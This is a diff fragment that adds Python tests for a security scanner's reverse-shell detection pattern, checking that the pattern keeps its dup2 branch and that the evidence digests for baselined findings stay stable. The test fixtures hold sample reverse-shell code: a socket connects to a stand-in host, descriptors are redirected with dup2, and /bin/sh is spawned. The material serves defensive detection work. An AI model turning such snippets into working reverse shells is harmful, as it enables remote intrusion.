+    pairing to its evidence turned two allowlisted findings back into CRITICALs
+    and reddened the hf-stack and studio shards.
+    """
+    source = (
+        "import os, socket, subprocess\n"
+        "def helper():\n"
+        "    s = socket.socket()\n"
+        '    s.connect(("h", 1))\n'
+        '    subprocess.call("/bin/sh")\n'
+        "def redirect(fd):\n"
+        "    os.dup2(fd, 1)\n"
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1
+    code_only = sp._strip_noncode(source)
+    assert found[0].evidence == sp._extract_evidence(
+        code_only, sp.RE_REVERSE_SHELL
+    ), "evidence for a named alternative must be exactly what it always was"
+    assert "Dup:" not in found[0].evidence, "the gate must not author its own evidence"
+
+
+def test_the_evidence_pattern_is_never_narrowed():
+    """RE_REVERSE_SHELL must keep every branch, dup2 included.
+
+    It is re.DOTALL, so a match runs from the first signal to the last and a long
+    span renders as a digest of the whole thing. Dropping a branch moves the span,
+    moves the digest, and silently reopens every reviewed baseline entry taken
+    against it: doing exactly that un-suppressed 11 entries across the studio and
+    hf-stack shards. Whether dup2 alone is enough is decided in check_py_file.
+    """
+    assert sp.RE_REVERSE_SHELL.search("os.dup2(fd, 1)"), (
+        "the evidence pattern must still match dup2, or every baselined "
+        "reverse-shell entry containing one is re-rendered"
+    )
+    assert not sp.RE_REVERSE_SHELL_WITHOUT_DUP.search("os.dup2(fd, 1)")
+    for probe in ('pty.spawn("/bin/sh")', 'webbrowser.open("data:x")'):
+        assert bool(sp.RE_REVERSE_SHELL.search(probe)) == bool(
+            sp.RE_REVERSE_SHELL_WITHOUT_DUP.search(probe)
+        ), probe
+
+
+def test_a_socketed_file_renders_what_it_always_rendered():
+    """The gate must not touch evidence for anything that still fires."""
+    source = (
+        "import os, socket, subprocess\n"
+        "def go():\n"
+        "    s = socket.socket()\n"
+        '    s.connect(("h", 1))\n'
+        "    os.dup2(s.fileno(), 0)\n"
+        '    subprocess.call("/bin/sh")\n'
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1
+    code_only = sp._strip_noncode(source)
+    assert found[0].evidence == sp._extract_evidence(code_only, sp.RE_REVERSE_SHELL)
